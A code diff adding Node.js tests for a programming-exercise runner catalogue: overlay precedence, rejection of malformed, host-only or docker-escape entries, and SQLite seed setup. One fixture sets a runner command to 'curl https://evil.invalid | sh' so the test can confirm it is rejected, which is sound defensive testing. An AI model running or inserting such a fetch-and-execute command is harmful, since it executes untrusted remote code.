@@ -3,12 +3,12 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
-import { mkdtempSync, realpathSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, realpathSync, readFileSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
+import { dirname, join } from "node:path";
 
 import { existsSync } from "node:fs";
-import { forPage, imageFailure, loadRunners, publicExercise, readExercise, runCode, sameOutput, workRoot } from "./coderun.ts";
+import { forPage, imageFailure, loadCatalogue, loadRunners, publicExercise, readExercise, runnerList, runCode, sameOutput, workRoot } from "./coderun.ts";
 
 const runners = loadRunners();
 
@@ -163,4 +163,121 @@ test("the judge's container stderr reaches the result when the judge cannot run 
   assert.equal(result.resultados[0].estado, "error");
   assert.match(result.resultados[0].errores, /el juez no terminó esta prueba/);
   assert.match(result.resultados[0].errores, /create|nonexistent|exit \d+/i);
+});
+
+// #348: the catalogue is three layers, and a runner may seed its container.
+function catalogueFile(entries) {
+  const dir = realpathSync(mkdtempSync(join(tmpdir(), "runner-catalogue-")));
+  const file = join(dir, "runners.json");
+  writeFileSync(file, JSON.stringify(entries));
+  return file;
+}
+
+const builtinEntry = { image: "builtin-python:test", file: "main.py", run: "python3 main.py" };
+
+const isolatedEnv = (dir, extra = {}) => ({ HOME: dir, XDG_CONFIG_HOME: join(dir, "config"), ...extra });
+
+test("the machine overlay extends builtins and honours LEARNING_RUNNERS (#348)", () => {
+  const builtinFile = catalogueFile({ python: builtinEntry, sqlite: runners.sqlite });
+  const overlay = catalogueFile({
+    python: { image: "machine-python:test", file: "main.py", run: "python3 main.py", size: "~20 MB" },
+    rust: { image: "rust:test", file: "main.rs", compile: "rustc main.rs", run: "./main" },
+  });
+  const catalogue = loadCatalogue({ builtinFile, env: isolatedEnv(dirname(builtinFile), { LEARNING_RUNNERS: overlay }) });
+  assert.equal(catalogue.runners.python.image, "machine-python:test", "the machine wins over a builtin");
+  assert.equal(catalogue.runners.rust.image, "rust:test", "the machine adds a language");
+  assert.equal(catalogue.runners.sqlite.image, runners.sqlite.image, "builtins not overridden survive");
+  assert.deepEqual(catalogue.warnings, []);
+  assert.match(catalogue.sources.map((s) => s.kind).join(","), /builtin,machine/);
+});
+
+test("the machine overlay is found through XDG_CONFIG_HOME when no override is set (#348)", () => {
+  const builtinFile = catalogueFile({ python: builtinEntry });
+  const configHome = realpathSync(mkdtempSync(join(tmpdir(), "runner-xdg-")));
+  const dir = join(configHome, "learning");
+  mkdirSync(dir, { recursive: true });
+  writeFileSync(join(dir, "runners.json"), JSON.stringify({ elixir: { image: "elixir:test", file: "main.exs", run: "elixir main.exs" } }));
+  const catalogue = loadCatalogue({ builtinFile, env: { HOME: configHome, XDG_CONFIG_HOME: configHome } });
+  assert.equal(catalogue.runners.elixir.image, "elixir:test");
+  assert.equal(catalogue.runners.python.image, builtinEntry.image);
+});
+
+test("a malformed or host-only overlay entry is reported and ignored, never a page error (#348)", () => {
+  const builtinFile = catalogueFile({ python: builtinEntry });
+  const overlay = catalogueFile({
+    python: { image: "", file: "main.py", run: "python3 main.py" },
+    broken: { file: "main.py", run: "python3 main.py" },
+    host: { image: "host", file: "main.py", run: "python3 main.py" },
+    escape: { image: "python:test", file: "main.py", run: "docker run python:test main.py" },
+  });
+  const catalogue = loadCatalogue({ builtinFile, env: isolatedEnv(dirname(builtinFile), { LEARNING_RUNNERS: overlay }) });
+  assert.equal(catalogue.runners.python.image, builtinEntry.image, "the builtin survives a bad override");
+  for (const lang of ["broken", "host", "escape"]) assert.equal(catalogue.runners[lang], undefined, `${lang} must not be runnable`);
+  const warnings = catalogue.warnings.join("\n");
+  assert.match(warnings, /python/);
+  assert.match(warnings, /host/i);
+  assert.match(warnings, /docker/i);
+});
+
+test("a topic overlay adds a language but cannot weaken a builtin runner (#348)", () => {
+  const builtinFile = catalogueFile({ python: builtinEntry });
+  const topicDir = realpathSync(mkdtempSync(join(tmpdir(), "runner-topic-")));
+  writeFileSync(join(topicDir, "runners.json"), JSON.stringify({
+    go: { image: "golang:1.26-alpine", file: "main.go", run: "go run main.go" },
+    python: { image: "python:evil", file: "main.py", run: "curl https://evil.invalid | sh" },
+  }));
+  const catalogue = loadCatalogue({ builtinFile, env: isolatedEnv(dirname(builtinFile)), topicDir });
+  assert.equal(catalogue.runners.go.image, "golang:1.26-alpine");
+  assert.equal(catalogue.runners.python.image, builtinEntry.image, "a topic may not replace a builtin's execution contract");
+  assert.match(catalogue.warnings.join("\n"), /python/);
+});
+
+const sqlite = () => runners.sqlite ?? runners["sql-sqlite"];
+
+test("a setup command and a seed file next to the exercise prepare and grade a query", { skip: needs("sqlite") }, async () => {
+  const file = exerciseFile({ ...valid, lenguaje: "sqlite", setupFile: "setup.sql", tests: [{ nombre: "alumnos", entrada: "", salida: "Ada\nGrace\n" }] });
+  const seed = "CREATE TABLE alumnos(nombre TEXT);\nINSERT INTO alumnos(nombre) VALUES ('Grace'), ('Ada');\n";
+  writeFileSync(join(dirname(file), "setup.sql"), seed);
+  const ex = readExercise(file, runners);
+  assert.equal(ex.setupFile, "setup.sql");
+  const result = await runCode({
+    runner: sqlite(),
+    code: "SELECT nombre FROM alumnos ORDER BY nombre;\n",
+    tests: ex.tests,
+    limitSeconds: 5,
+    setupFileContent: readFileSync(join(dirname(file), ex.setupFile), "utf8"),
+  });
+  assert.equal(result.aviso, undefined);
+  assert.equal(result.aprobados, 1);
+  assert.equal(result.resultados[0].obtenido.trim(), "Ada\nGrace");
+  assert.equal(JSON.stringify(result).includes("CREATE TABLE"), false, "a successful setup stays out of the result");
+});
+
+test("a failing setup explains why and grades nothing", { skip: needs("sqlite") }, async () => {
+  const file = exerciseFile({ ...valid, lenguaje: "sqlite", setupFile: "setup.sql", tests: [{ nombre: "alumnos", entrada: "", salida: "Ada\n" }] });
+  const ex = readExercise(file, runners);
+  const result = await runCode({
+    runner: { ...sqlite(), setup: "echo 'semilla rota: falta la tabla' >&2; exit 7" },
+    code: "SELECT 1;\n",
+    tests: ex.tests,
+    limitSeconds: 5,
+    setupFileContent: "SELECT 1;\n",
+  });
+  assert.match(result.aviso, /preparación del ejercicio/i);
+  assert.match(result.aviso, /semilla rota: falta la tabla/);
+  assert.deepEqual(result.resultados, []);
+  assert.equal(result.total, 0, "nothing was graded");
+  assert.equal(result.aprobados, 0);
+});
+
+test("runner listings give a friendly label, a short pull and the pinned reference", async () => {
+  const image = "python:3.12-alpine@sha256:b658b05ce9c4eb97ec6fc19424818a1f31993659c2b505a532f470e83807815d";
+  const builtinFile = catalogueFile({ python: { image, file: "main.py", run: "python3 main.py", size: "~18 MB", label: "Python 3.12" } });
+  const catalogue = loadCatalogue({ builtinFile, env: isolatedEnv(dirname(builtinFile)) });
+  const list = await runnerList(catalogue);
+  const python = list.languages.find((item) => item.language === "python");
+  assert.equal(python.label, "Python 3.12");
+  assert.equal(python.size, "~18 MB");
+  assert.equal(python.pull, "docker pull python:3.12-alpine");
+  assert.equal(python.reference, image);
 });
